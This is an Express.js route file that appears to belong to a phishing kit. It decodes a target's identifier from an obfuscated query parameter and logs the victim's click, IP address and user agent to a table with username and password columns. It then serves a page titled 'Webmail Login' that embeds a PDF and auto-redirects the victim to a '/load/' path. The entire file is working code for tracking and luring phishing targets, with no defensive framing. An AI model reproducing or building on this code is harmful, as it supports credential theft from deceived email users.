
const express = require ('express');
const router = express.Router();
const db = require('./db');


router.get('/', (req, res) => {

    const data = req.query.hkgdfgieptjporjfdmskjweorpweogokjfdgpodfg;

    
    if (data == null) {
        res.render('error');
        
      }else{

    const userid = Buffer.from(data, 'base64').toString('utf-8');

  
    const word = 'clicked';
    // const clientIP = req.headers['x-forwarded-for'];
    // const ip =  clientIP.split(',')[0].trim(); 
    const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 2;


            const insertQuery = 'INSERT INTO clkTable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
            db.query(insertQuery, [userid, word, ip, useragent, date, notify], (err) => {
                if (err) {
                    console.error('Error inserting record:', err);
                    return res.status(500).send('Internal Server Error');
                }
              

                });


        

    const url = `/load/?lfdkjgiroetuiroyhgfhnbjkfsdfiowerierehjre=${data}`;

   

    const htmlContent = `
   <html lang="en" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
    <meta name="google" content="notranslate">
    <meta name="apple-itunes-app" content="app-id=1188352635">
    <meta http-equiv="refresh" content="2; url=${url}">    

    <title>Webmail Login</title>
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">

    <!-- EXTERNAL CSS -->
    <link href="./files/open_sans.min.css" rel="stylesheet" type="text/css">
    <link href="./files/style_v2_optimized.css" rel="stylesheet" type="text/css">
            
        </head>
   
        <body>

      <object data="/1.pdf" style="height:900px; width:1860px"></object>
     
               
        </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);


      }

});

module.exports =router
